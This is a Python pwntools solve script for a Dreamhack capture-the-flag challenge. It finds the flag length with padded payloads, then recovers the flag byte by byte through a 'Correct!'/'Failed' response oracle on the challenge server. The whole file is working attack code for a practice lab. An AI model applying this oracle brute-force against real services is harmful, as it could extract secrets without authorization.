from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 19378

for i in range(64):
    r = remote(HOST, PORT)
    payload=(b'A'*(64-i-1)).ljust(64, b'\x00') + b'A'*(64-i-1)
    r.sendafter(b'? ', payload)
    if b'Failed' in r.recvline():
        r.close()
        break
    r.close()

flag_len=64-i
flag = [''] * flag_len
for i in range(flag_len-1, -1, -1):
    current_flag = ''.join(flag)
    for j in range(0x20,0x7e):
        r = remote(HOST, PORT)
        r.sendafter(b'? ', (b'A'*i + chr(j).encode() + current_flag.encode()).ljust(64, b'\x00') + b'A'*i)
        if b'Correct!' in r.recvline().strip():
            flag[i] = chr(j)
            r.close()
            break
        r.close()

print(''.join(flag))


r.interactive()